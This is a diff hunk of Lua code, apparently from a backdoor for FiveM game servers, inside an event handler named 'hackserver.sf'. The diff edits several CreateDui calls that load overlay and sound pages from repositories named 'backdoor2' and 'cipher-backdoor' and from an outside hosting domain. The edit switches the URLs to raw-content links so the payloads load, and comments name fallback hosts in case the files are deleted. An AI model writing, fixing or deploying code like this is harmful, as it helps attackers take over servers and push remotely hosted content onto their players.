@@ -10483,14 +10483,14 @@ AddEventHandler("hackserver.sf", function()
 	   end
 	end)
 
-	local sound = CreateDui("https://github.com/brayden1337/backdoor2/blob/main/backdoor/ui/sound/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
+	local sound = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/sound/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
 
 	local textureDic = CreateRuntimeTxd('duiTxd');
 
 	local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
-	local object = CreateDui("https://github.com/brayden1337/backdoor2/blob/main/backdoor/ui/text%20overlay/y.html", 1920, 1080);
-	local object2 = CreateDui("https://github.com/brayden1337/backdoor2/blob/main/backdoor/ui/cipher_bug/cipher_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
-	local object3 = CreateDui("https://github.com/brayden1337/backdoor2/blob/main/backdoor/ui/overlay/screen3_2.html", 1920, 1080);
+	local object = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/text%20overlay/y.html", 1920, 1080);
+	local object2 = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/cipher_bug/cipher_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
+	local object3 = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/overlay/screen3_2.html", 1920, 1080);
 
 	local handle = GetDuiHandle(object) -- Gets DUI handle from object
 	local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
